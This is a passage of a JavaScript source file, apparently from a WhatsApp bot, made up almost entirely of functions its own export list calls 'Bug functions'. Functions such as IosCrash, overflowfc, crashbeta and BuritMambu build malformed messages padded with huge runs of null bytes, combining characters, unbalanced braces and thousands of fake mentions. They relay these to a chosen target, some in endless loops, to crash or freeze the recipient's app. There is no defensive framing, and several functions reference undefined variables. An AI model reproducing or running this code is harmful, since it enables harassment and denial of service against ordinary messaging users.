                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}
async function OneKanjutTry(sock, target) {
    while (true) {
        try {
            const msg = await generateWAMessageFromContent(
                target,
                {
                    groupStatusMessageV2: {
                        message: {  
                            interactiveResponseMessage: {
                                body: {
                                    text: "T5 Nihk",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "galaxy_message",
                                    paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(999999)}\"}}`,
                                    version: 3
                                }
                            }
                        }
                    }
                },
                { userJid: sock.user.id } 
            );

            await sock.relayMessage(
                target,
                msg.message,
                {
                    messageId: msg.key.id,
                    participant: { jid: target }
                }
            );

            console.log(`T5 ke ${target} (Looping Active)`);

            await new Promise(resolve => setTimeout(resolve, 1000));

        } catch (err) {
            console.error("❌ Error dalam Loop:", err);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}
async function DelayKntol(sock, target) {
  let ButtonsPush = []
  for (let i = 0; i < 1000; i++) {
    ButtonsPush.push(
      {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(100000)
        })
      },
      {
        name: "mpm",
        buttonParamsJson: JSON.stringify({
          status: true
        })
      },
      {
        name: "cta_call",
        buttonParamsJson: JSON.stringify({
          status: true
        })
      }
    )
  }
  const msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      pollCreationMessageV4: {
        message: {
          message: {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: {
                    title: " kelra - executed ",
                    subtitle: "",
                    hasMediaAttachment: true,
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                      mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                      fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                      fileLength: "999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                      fileName: "NvX",
                      directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070",
                      mediaKeyTimestamp: "1743848703"
                    }
                  },
                  body: {
                    text: ""
                  },
                  footer: {
                    text: ""
                  },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                          display_text: "\u0000".repeat(100000),
                          id: "ctk_1"
                        })
                      }
                    ]
                  },
                  interactiveResponseMessage: {
                    body: {
                      text: ""
                    },
                    nativeFlowResponseMessage: {
                      paramsJson: "{{....}}",
                      responseJson: null
                    }
                  }
                }
              }
            }
          },

          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            messageAssociation: {
              associationType: 7,
              parentMessageKey: crypto.randomBytes(16)
            }
          },

          pollCreationMessageV3: {
            body: {
              text: "\u0000".repeat(100000),
              format: "DEFAULT"
            },

            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(100000),
              version: 3
            },

            buttons: ButtonsPush,

            options: null,

            selectableOptionsCount: 99999
          }
        }
      }
    }),
    {}
  )

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
  })
}
async function IosCrash(sock, target) {
  const Msg = {
    locationMessage: {
      name: "RyX" + "𑇂𑆵𑆴𑆿".repeat(25000), 
      address: "R7X" + "𑇂𑆵𑆴𑆿".repeat(15000),
    },
    contextInfo: {
      externalAdReply: {
        renderLargerThumbnail: true,
        showAdAttribution: true,
        body: "Ryui R7X",
        title: "ೄྀ".repeat(10000), 
        sourceUrl: "https://t.me/" + "༒".repeat(10000),
        thumbnailUrl: null,
      }
    }
  };

  await sock.relayMessage("status@broadcast", Msg, {
    additional: [{
      tag: "meta", 
      attrs: {}, 
      content: [{
        tag: "mentioned_users", 
        attrs: {}, 
        content: [{
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined 
        }]
      }]
    }]
  });
}
async function tesss(sock, target) {
    const kel = "\u0000".repeat(90000) + "ꦽ".repeat(10000)
    let q
    let Msg
    for (let i = 0; i < 1000; i++) {
        let mentions = [
            "13651718@s.whatsapp.net",
            ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            )
        ]
        const msg = generateWAMessageFromContent(
            target,
            proto.Message.fromObject({
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "kelra - kikuk",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "\u200B".repeat(10000)
                            },
                            footer: {
                                text: "\u200B".repeat(10000)
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "quick_reply",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "\u0000".repeat(90000),
                                            id: "x500"
                                        })
                                    }
                                ]
                            }
                        }
                    }
                },
                pollCreationMessageV4: {
                    message: {
                        messageContextInfo: {
                            messageSecret: crypto.randomBytes(32),
                            messageAssociation: {
                                associationType: 7,
                                parentMessageKey: crypto.randomBytes(16)
                            }
                        },
                        pollCreationMessageV3: {
                            name: "ꦽꦽꦽ" + "\u200B".repeat(20000),
                            options: [
                                {
                                    optionName: "\u200B".repeat(10000)
                                },
                                {
                                    optionName: "ꦽ".repeat(10000)
                                }
                            ],
                            selectableOptionsCount: 1
                        }
                    }
                },
                buttonsResponseMessage: {
                    selectedButtonId: "payment_info",
                    selectedDisplayText: "#",
                    contextInfo: {
                        participant: target,
                        mentionedJid: mentions,
                        isForwarded: true,
                        forwardingScore: 9999,
                        urlTrackingMap: {
                            urlTrackingMapElements: Array.from({ length: 1900 }, () => ({}))
                        }
                    }
                }

            }),
            {}
        )
        q = {
            key: {
                remoteJid: "status@broadcast",
                fromMe: false,
                id: "MAIN-" + Math.floor(Math.random() * 999999999),
                participant: "0@s.whatsapp.net"
            },
            message: {
                conversation: kel,
                extendedTextMessage: {
                    text: kel,
                    contextInfo: {
                        mentionedJid: mentions,
                        stanzaId: "id-" + Math.floor(Math.random() * 999999999),
                        participant: "0@s.whatsapp.net"
                    }
                },
                buttonsResponseMessage: msg.message.buttonsResponseMessage,
                pollCreationMessageV4: msg.message.pollCreationMessageV4,
                viewOnceMessage: msg.message.viewOnceMessage
            }
        }
    }
    for (let i = 0; i < 1000; i++) {
        Msg = {
            call: {
                callType: 2,
                callId: String(Date.now()),
                callStartTimestamp: Date.now(),
                contextInfo: {
                    forwardingScore: 999999,
                    isForwarded: true,
                    stanzaId: "ctx-" + Date.now(),
                    participant: "0@s.whatsapp.net",
                    remoteJid: target,
                    mentionedJid: [
                        target,
                        "0@s.whatsapp.net",
                        ...Array.from(
                            { length: 1900 },
                            () => "1" + Math.floor(Math.random() * 99999999) + "@s.whatsapp.net"
                        )
                    ],
                    entryPointConversionSource: "global_search_new_chat",
                    entryPointConversionApp: "com.whatsapp",
                    entryPointConversionDelaySeconds: 1,
                    quotedMessage: q.message
                }
            }
        }
    }

    await sock.relayMessage(target, Msg, { quote: q })
}
async function AstecTest(sock, target) {
    const corruptJson = "{".repeat(90000);
    const nullBytes = "\x00".repeat(400000);
    
    for (let i = 0; i < 35; i++) {
        // Pesan Pertama: ViewOnce Interactive
        await sock.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: nullBytes },
                        nativeFlowMessage: {
                            buttons: [{ name: "single_select", buttonParamsJson: corruptJson }],
                            messageParamsJson: corruptJson
                        },
                        contextInfo: {
                            mentionedJid: [ "0".repeat(3000) + "@s.whatsapp.net" ],
                            forwardingScore: 999
                        }
                    }
                }
            }
        }, { participant: { jid: target } });
        
        // Pesan Kedua: Interactive Response (Perbaikan pada paramsJson)
        await sock.relayMessage(target, {
            interactiveResponseMessage: {
                body: { text: nullBytes },
                nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: JSON.stringify({ flow_cta: nullBytes }), // Perbaikan sintaksis di sini
                    version: 3
                }
            }
        }, { participant: { jid: target } });
    }
    
    return { status: "Lau Siape Mpruy?", target };
}
//new func kunyuk
async function crashfcnewxryy(sock, target) {
const xryy1 = "𝙓𝙍𝙮𝙮𝙁𝙤𝙧𝙘𝙚" + "𑇂𑆵𑆴𑆿" + "ꦾ".repeat(60000);
  const xryy2 = "𝙍𝙮𝙮𝙑𝙨𝙈𝙖𝙠𝙡𝙤𝙬𝙝" + "\u0000".repeat(12000);
  
    let msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
nativeFlowMessage: {
    title: xryy1 + xryy2, // jangan null
    messageParamsJson: JSON.stringify({
        text: "𝙓𝙍𝙮𝙮𝙁𝙘𝙆𝙖𝙩𝙖𝙣𝙮𝙖" + "𑇂𑆵𑆴𑆿".repeat(45000), 
    }),
    buttons: [
        {
            name: "cta_url",
            buttonParamsJson: null, 
        },
        {
            name: "quick_reply",
            buttonParamsJson: null,
        }, 
{
            name: "galaxy_message",
            buttonParamsJson: null, 
        },
        {
            name: "catalog_message",
            buttonParamsJson: null,
        }, 
{
            name: "call_message_request",
            buttonParamsJson: null, 
        },
        {
            name: "cta_flow",
            buttonParamsJson: null,
        }
        
    ]
}
                }
            }
        }
    };

    try {
        await sock.relayMessage(target, msg, {
            messageId: null
        });
    } catch (e) {
        console.log("Error:", e);
    }
}
async function overflowfc(target) {
  for (let i = 0; i < 100; i++) {
    let msg = await generateWaMessageFromContent(target, {
      groupStatusMessageV2: {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: 'xryyinibapaklu',
                locationMessage: {
                  degreesLatitude: 323000,
                  degreesLongitude: -323000,
                  name: '}'.repeat(50000),
                  address: '{'.repeat(50000),
                },
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net"],
              },
              body: {
                text: 'xryyinibapaklo',
              },
              nativeFlowMessage: {
                messageParamsJson: '{'.repeat(50000),
              }
            }
          }
        }
      }
    });

    await sock.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });

    console.log(`sukses send bug: ${target}`);
  }
}
//beta
async function crashbeta(target, ptcp = false) {
let BetaFc = "XRyyBetaFC" + "ꦾ".repeat(25000);

const xryy = {
    ephemeralMessage: {
        message: {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: -998.97388882,
                        caption: BetaFc,
                        sequenceNumber: "",
                        jpegThumbnail: null
                    },
                    body: {
                        text: BetaFc
                    },
                                nativeFlowMessage: {
            messageParamsJson: "𝙓𝙍𝙮𝙮𝙎𝙖𝙮𝙃𝙞" + "𑇂𑆵𑆴𑆿".repeat(10000),
            buttons: [
              { name: "galaxy_message", buttonParamsJson: null }, 
              { name: "call_message_request", buttonParamsJson: null }, 
              { name: "single_select", buttonParamsJson: null }, 
            ], 
          },
                    contextInfo: {
                     contactVcard: true,
                        mentionedJid: [m.chat],
                        groupMentions: [
                            { 
                                groupJid: "@120363321780343299@g.us", 
                                groupSubject: "mengjawa" 
                            }
                        ]
                    }
                }
            }
        }
    }
};

await sock.relayMessage(target, xryy, {});
};
// bleng one msg
async function blankmsg(sock, target) {
     let sections = [];
     let listMessage = {
        title: "Maklo",
        sections: sections,
      };
    await nando.relayMessage(
        target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 0,
                        degreesLongitude: 0, // 💎 Sudah diperbaiki: menghapus tanda kutip sisa
                        caption: 'Lu Jelek'+ "ꦿꦾ".repeat(100000) + "@1".repeat(50000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                        nativeFlowMessage: {
    messageParamsJson: "ꦿꦾ".repeat(10000),
    buttons: [
        {
            name: "single_select",
            buttonParamsJson: "\u0000".repeat(10000),
        },
        {
            name: "mpm",
            buttonParamsJson: "ꦿꦾ".repeat(10000),
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "X",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "XRyyVsIbulu@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "XRyySecretDocu",
                "screen_0_Dropdown_2": "#926-X",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
  contextInfo: {
      forwardingScore: 9999,
            isForwarded: true,
                    quotedMessage: {
                             documentMessage: {
                  url: "https://mmg.whatsapp.net/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256:
                    "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "X",
                  fileEncSha256:
                    "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath:
                    "/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath:
                    "/text/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256:
                    "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256:
                    "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
                    contactVcard: true
                        },
                            groupMentions: [{
                                groupJid: "1@newsletter",
                                groupSubject: " X "
                            }]
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        }
    );
}
async function BuritMambu(sock, target) {
  try {
    const heavy = "ꦿꦾ".repeat(100000);
    const poison = "\u0000".repeat(100000);
    const complex = "𑜦𑜠".repeat(50000);

    const generateDeepPayload = () => {
      let sections = [];
      for (let i = 0; i < 100; i++) {
        sections.push({
          title: heavy,
          rows: [
            { title: complex, rowId: "delay-" + i },
            { title: poison, rowId: "kill-" + i }
          ]
        });
      }
      return sections;
    };

    const delayPayload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: heavy,
              hasMediaAttachment: true,
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/dummy.enc",
                mimetype: "application/vnd.android.package-archive",
                fileLength: "9999999999999",
                fileName: complex,
                fileSha256: Buffer.alloc(32),
                fileEncSha256: Buffer.alloc(32),
                mediaKey: Buffer.alloc(32)
              }
            },
            body: { text: heavy + poison + complex },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "HALLO INI AZRIL👋",
                    sections: generateDeepPayload()
                  })
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }
              ]
            },
            contextInfo: {
              stanzaId: "HALLO INI AZRIL 👋" + Math.random(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                listMessage: {
                  title: heavy,
                  description: poison,
                  buttonText: complex,
                  listType: 1,
                  sections: generateDeepPayload()
                }
              },
              externalAdReply: {
                title: complex,
                body: heavy,
                mediaType: 1,
                renderLargerThumbnail: true,
                thumbnail: Buffer.alloc(1024 * 900),
                sourceUrl: "https://"
              }
            }
          }
        }
      }
    };

    const targets = Array.isArray(target) ? target : [target];
    
    for (let jid of targets) {
      for (let i = 0; i < 5; i++) {
        await sock.relayMessage(jid, delayPayload, { 
          participant: { jid: jid },
          additionalAttributes: {
            push_priority: "high",
            category: "peer"
          }
        });
        
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    }
  } catch (e) {
    console.log(e);
  }
}
module.exports = {
  // Session management
  activeConnections,
  biz,
  mess,
  prepareAuthFolders,
  detectWATypeFromCreds,
  connectSession,
  startUserSessions,
  disconnectAllActiveConnections,
  isVipOrOwner,
  getVipSessionPath,
  prepareVipSessionFolders,
  connectVipSession,
  startVipSessions,
  getActiveVipConnections,
  isVipSession,
  getRandomVipConnection,
  checkActiveSessionInFolder,
  sleep,

  // Bug functions
  crashfcnewxryy,
  BuritMambu,
  blankmsg,
  crashbeta,
  PrePortDoc,
  overflowfc,
  tesss,
  AstecTest,
  IosCrash,
  DelayKntol,
  OneKanjutTry,
  DocFC,
  StravasFC,
  bulldozerV2,
  combo2,
  combo3,
  bleng,
  epcinjir,
  onemsg,
BetaExploit,
  ZenoCrashNoClick,
  VnXDelayXBulldoNew,
  VnXFcCodeMetaNew,
  fcinvisotax,
  AhhCrot,
  DileyInvisi,
  focusedimfocused,
  Nyawit,
  MarkNyawit,
  producInvite,
  FreezePackk,
  InTransitBusiness,
  CrashClick,
  DelayCarousel,
  gsGlx,
  sticker9ack,
  blank,
  denglay,
  intVerify,
  permenCall,
  crsh,
  crssh,
  delaynnnnNew,
  fcno,
  XxContact,
  ioz,
  blaplouunk,
  blpank,
  blanpk,
  plo,
  blanokmhk,
  blapoymnk,
  R9X,
};